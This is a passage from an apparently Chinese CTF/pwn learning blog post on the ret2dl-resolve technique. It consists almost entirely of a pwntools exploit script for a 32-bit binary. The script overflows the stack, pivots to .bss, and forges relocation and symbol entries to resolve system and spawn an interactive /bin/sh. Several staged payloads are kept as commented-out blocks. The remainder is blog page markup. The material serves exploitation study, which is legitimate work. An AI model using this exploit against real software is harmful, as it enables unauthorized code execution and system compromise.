class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload_1 = <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">0x6c</span> + <span class="hljs-number">4</span>)<br>payload_1 += p32(read_plt)<br>payload_1 += p32(pop3_ret)<br>payload_1 += p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">100</span>)<br>payload_1 += p32(pop_ebp_ret)<br>payload_1 += p32(bss_addr)<br>payload_1 += p32(lea_ret)<br>sh.recv()<br>sh.send(payload_1)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = 0x20</span><br><span class="hljs-string">payload_2 = &quot;aaaa&quot;      # new ebp</span><br><span class="hljs-string">payload_2 += p32(plt_0)      # jump to PLT0</span><br><span class="hljs-string">payload_2 += p32(reloc_index)        # push 0x20</span><br><span class="hljs-string">payload_2 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_2 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_2 += &quot;a&quot; * (80 - len(payload_2))</span><br><span class="hljs-string">payload_2 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_2 += &quot;a&quot; * (100 - len(payload_2))</span><br><span class="hljs-string">sh.send(payload_2)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_info = 0x607</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">payload_3 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_3 += p32(plt_0)</span><br><span class="hljs-string">payload_3 += p32(reloc_index)</span><br><span class="hljs-string">payload_3 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_3 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_3 += fake_reloc         # bss_addr + 28</span><br><span class="hljs-string">payload_3 += &quot;a&quot; * (80 - len(payload_3))</span><br><span class="hljs-string">payload_3 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_3 += &quot;a&quot; * (100 - len(payload_3))</span><br><span class="hljs-string">sh.send(payload_3)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_sym = (bss_addr + 36 - dynsym) / 0x10</span><br><span class="hljs-string">r_type = 0x7</span><br><span class="hljs-string">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">fake_sym = p32(0x4c) + p32(0) + p32(0) + p32(0x12) + p32(0) + p32(0)</span><br><span class="hljs-string">payload_4 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_4 += p32(plt_0)</span><br><span class="hljs-string">payload_4 += p32(reloc_index)</span><br><span class="hljs-string">payload_4 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_4 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_4 += fake_reloc</span><br><span class="hljs-string">payload_4 += fake_sym           # bss_addr + 36</span><br><span class="hljs-string">payload_4 += &quot;a&quot; * (80 - len(payload_4))</span><br><span class="hljs-string">payload_4 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_4 += &quot;a&quot; * (100 - len(payload_4))</span><br><span class="hljs-string">sh.send(payload_4)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">reloc_index = bss_addr + 28 - rel_plt</span><br><span class="hljs-string">r_sym = (bss_addr + 36 - dynsym) / 0x10</span><br><span class="hljs-string">r_type = 0x7</span><br><span class="hljs-string">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="hljs-string">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="hljs-string">st_name = bss_addr + 60 - dynstr</span><br><span class="hljs-string">st_bind = 0x1</span><br><span class="hljs-string">st_type = 0x2</span><br><span class="hljs-string">st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span><br><span class="hljs-string">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info) + p32(0) + p32(0)</span><br><span class="hljs-string">payload_5 = &quot;aaaa&quot;</span><br><span class="hljs-string">payload_5 += p32(plt_0)</span><br><span class="hljs-string">payload_5 += p32(reloc_index)</span><br><span class="hljs-string">payload_5 += &quot;aaaa&quot;</span><br><span class="hljs-string">payload_5 += p32(1) + p32(bss_addr + 80) + p32(len(&quot;/bin/sh&quot;))</span><br><span class="hljs-string">payload_5 += fake_reloc</span><br><span class="hljs-string">payload_5 += fake_sym</span><br><span class="hljs-string">payload_5 += &quot;write\x00&quot;            # bss + 60     </span><br><span class="hljs-string">payload_5 += &quot;a&quot; * (80 - len(payload_5))</span><br><span class="hljs-string">payload_5 += &quot;/bin/sh\x00&quot;</span><br><span class="hljs-string">payload_5 += &quot;a&quot; * (100 - len(payload_5))</span><br><span class="hljs-string">sh.send(payload_5)</span><br><span class="hljs-string">sh.recv()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(plt_0)<br>payload_6 += p32(reloc_index)<br>payload_6 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 += fake_reloc<br>payload_6 += fake_sym<br>payload_6 += <span class="hljs-string">&quot;system\x00&quot;</span>          <br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_6))<br>payload_6 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_6))<br>sh.send(payload_6)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9D%9F/" class="category-chain-item">Pwn：从入门到入坟</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ret2dl-resolve/">#ret2dl-resolve</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ret2dl-resolve</div>
+      <div>http://example.com/2022/04/17/Pwn/ret2dlresolve/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Pursue</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年4月17日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/01/CTF_competition/2022ciscn/" title="2022 ciscn 初赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022 ciscn 初赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
